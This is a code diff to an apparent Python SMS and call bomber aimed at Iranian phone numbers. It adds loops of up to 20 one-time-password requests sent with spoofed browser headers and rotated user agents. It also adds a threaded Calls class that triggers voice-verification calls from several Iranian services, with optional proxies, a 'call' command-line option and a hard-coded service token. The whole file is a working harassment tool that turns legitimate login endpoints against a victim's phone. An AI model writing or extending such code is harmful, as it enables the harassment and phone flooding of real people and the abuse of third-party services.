@@ -5,6 +5,8 @@ from sys import argv, exit
 from random import choice
 from os import path
 from threading import Thread
+from user_agent import generate_user_agent as agent
+from time import sleep
 
 
 
@@ -223,11 +225,32 @@ class Sms:
         except: pass
 
     def pateh(self):
-        try: 
-            post(url="https://api.pateh.com/api/v1/LoginOrRegister",
-                    json={"mobile": f'0{self.phone.split("+98")[1]}'},
-                    proxies=self.proxy)
-        except: pass
+        for i in range(20):
+            try: 
+                post(url="https://api.pateh.com/api/v1/LoginOrRegister",
+                        json={"mobile": f'0{self.phone.split("+98")[1]}'},
+                        proxies=self.proxy,
+                        headers={
+    "authority": "api.pateh.com",
+    "method": "POST",
+    "path": "/api/v1/LoginOrRegister",
+    "scheme": "https",
+    "Accept": "application/json, text/plain, */*",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
+    "Content-Length": "24",
+    "Content-Type": "application/json;charset=UTF-8",
+    "Origin": "https://www.pateh.com",
+    "Referer": "https://www.pateh.com/",
+    "Sec-Ch-Ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
+    "Sec-Ch-Ua-Mobile": "?0",
+    "Sec-Ch-Ua-Platform": "Windows",
+    "Sec-Fetch-Dest": "empty",
+    "Sec-Fetch-Mode": "cors",
+    "Sec-Fetch-Site": "same-site",
+    "User-Agent": agent(os="win")
+            })
+            except: pass
 
     def ketabchi(self):
         try: 
@@ -711,6 +734,24 @@ class Sms:
         except: pass
 
 
+class Calls:
+    def __init__(self, phone, proxy) -> None:
+        self.phone, self.proxy = phone, proxy
+    
+    def call1(self):
+        try: 
+            get(url=f'https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{self.phone}',
+                    proxies=self.proxy)
+            persian = get(f"https://api.codebazan.ir/adad/?text={self.phone}").json()
+            get('https://www.tezolmarket.com/Account/Login',
+                    f'PhoneNumber=۰{persian["result"]["fa"]}&SendCodeProcedure=1')
+            get(url=f'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{self.phone}&type=IVR')
+        except: pass
+    def call2(self):
+        post(url="https://novinbook.com/index.php?route=account/phone",data=f"phone=0{self.phone}&call=yes",headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': agent(os="win"),'x-requested-with': 'XMLHttpRequest'})
+
+    def call3(self):   
+        get(url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{self.phone}", headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','device': 'web','deviceid': '6','referer': 'https://www.azki.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': agent(os="win"),'user-name': 'null','user-token': '2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'})
 
 
 def main(phonenum: str, proxy):
@@ -720,6 +761,16 @@ def main(phonenum: str, proxy):
     for a in attrs:
         try: Thread(target=getattr(x, a)).start()
         except: pass
+
+
+def main_call(phonenum: str, proxy):
+    pr = { "http": proxy, "https": proxy} if proxy else None
+    x = Calls(phone=phonenum, proxy=pr)
+    attrs = [method for method in dir(x) if callable(getattr(x, method)) if not method.startswith('_')]
+    for a in attrs:
+        try: Thread(target=getattr(x, a)).start()
+        except: pass
+        sleep(5)
 
 if __name__ == "__main__":
     banner = '''
@@ -811,6 +862,8 @@ if __name__ == "__main__":
                 else:
                     return ''.join(nums)
             if args:
+                if 'call' in ' '.join(args):
+                    main_call(phonenum=num, proxy=None)
                 threads = return_num(''.join(args).split('threads')[1]) if not 'threads' in args else 1
                 if 'proxies' in ' '.join(args):
                     System.Title(f"Threads: {threads} , Proxies: True, Number: {num}")
